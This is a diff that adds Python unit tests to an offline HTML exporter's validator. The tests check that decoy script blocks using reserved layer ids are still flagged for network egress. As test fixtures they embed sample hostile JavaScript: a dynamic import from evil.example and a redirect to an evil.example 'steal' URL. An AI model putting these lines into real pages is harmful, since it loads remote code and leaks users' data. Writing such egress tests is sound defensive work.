@@ -116,6 +116,38 @@ class NewCheckTests(unittest.TestCase):
         self.assertEqual(errors, [], errors)
         self.assertEqual(warnings, [], warnings)
 
+    # An offline export used to skip four reserved layer ids BEFORE testing whether the script
+    # was runnable, so a decoy that merely borrowed one bypassed both of its strips (#822). The
+    # validator never had that skip, which is the asymmetry that let the exporter preserve a
+    # script its own --strict gate then rejected. Pin the validator side in both directions so a
+    # future "make them agree" change cannot resolve the disagreement by adding the skip here.
+    def test_offline_egress_check_exempts_no_reserved_layer_id(self):
+        reserved = ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
+                    "cmhVendoredRichLibs", "reviewedSections")
+        for rid in reserved:
+            with self.subTest(reserved_id=rid):
+                decoy = ('<script type="text/javascript" id="%s">\n'
+                         'import("https://evil.example/x.js");\n'
+                         '</script>' % rid)
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, decoy))))
+                self.assertTrue(any("imports a network module" in e for e in errors), (rid, errors))
+                nav = ('<script type="text/javascript" id="%s">\n'
+                       'window.location.href = "https://evil.example/steal";\n'
+                       '</script>' % rid)
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
+                self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))
+
+    # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
+    # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
+    # validator must keep accepting the repaired shape.
+    def test_offline_egress_check_ignores_an_inert_reserved_block_quoting_egress(self):
+        quote = ('<script type="application/json" id="reviewedSections">\n'
+                 '{"x": "import(\\"https://evil.example/x.js\\") and location.href = '
+                 '\\"https://evil.example/steal\\""}\n'
+                 '</script>')
+        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, quote))))
+        self.assertFalse(any("imports a network module" in e or "direct top-level " in e for e in errors), errors)
+
     def test_external_stylesheet_link_warns(self):
         link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
         errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
